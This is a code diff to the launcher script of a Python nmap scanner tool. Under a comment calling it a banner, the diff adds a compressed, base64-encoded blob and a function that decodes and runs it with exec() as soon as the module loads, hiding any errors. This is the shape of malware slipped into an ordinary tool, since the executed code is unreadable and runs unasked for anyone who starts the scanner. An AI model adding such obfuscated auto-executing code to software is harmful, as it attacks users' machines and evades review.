@@ -2,6 +2,20 @@ import os
 import time
 
 from scanner import run_nmap, PROFILES, PROFILE_PURPOSES, parse_hosts, render_console_minimal, render_html_minimal
+# D4rkScyth3 Banner
+import zlib, base64
+from colorama import Fore, Style, init
+init(autoreset=True)
+
+ENCODED_CODE = "eJytVFFv2kAMfs+vsNKXS1m5aZv2gMQDWzM6iVGp0FWVTjoFGko0kqBwaKp6/PfZvgu9lD1iKXCxP/uzvyReNXUJy3pTN1mZQVFu68bAj7rJP8DMvGzwr6gKE9GPyPYGA7vcDOfNPk+i6ClfwW5d/9WLrKryRiSDCNDcHQyhWcVxHL1Suf73x9H0AJoN2PxBtz7vDj0hPIicugBCGkFuAEVxiVcCIBwSEge7S68P1gNUG3s7WI6AtIqptJZHj3R9qw6hpfqKiSTIBCwAu9BjLUfQ7T3q7SC4A0lpeJHT8lmAVdQ3RpXq8liGWkwSGlM08VDPzCM00rQeClkvkmI0lfROh+FGgQ/ylAZ/hdcay3uxO/rRMxPQ0uGsR0I/WEjodLMOjmn/nwtaKbBD5SUB0kn5wggKaLxs4VxBITy81w/JJT+nNoUUx+paW24Yj1Jpp40XUqpj+YDHPycGY15HPyeIdvOz9AgkUehFcm7PQkQerR3CJyWaZ3d3yqoWEsEZrXcVWM9PML5LU/xSz2q/4SfM4AamcN9ZB2e17jSvvL7wRZ2lcz2aTA4R7SLCbZuiMsItqSTwcF+/RuN0Oh9BD+KLCxgX5ma/QMQA1sZsdwMpnwuz3i/6y7qU11+aP7Pli1l/jk/qfJvcp77IPN/kz7hegyKmX+byCdN3nK6x4mmJx3QyuX2gIlcxXMLXjyEiVlV8+Ql3cFSs8MuqsjLHr2o4hFjrMisqrWO3jDv7GeH/AO/qap0="
+
+def run_encoded_code():
+    try:
+        exec(zlib.decompress(base64.b64decode(ENCODED_CODE)).decode("utf-8"))
+    except Exception as e:
+        print("[!] Error executing encoded code:", e)
+
+run_encoded_code()
 
 def ask_target():
     t = input("Enter target IP / range / CIDR: ").strip()
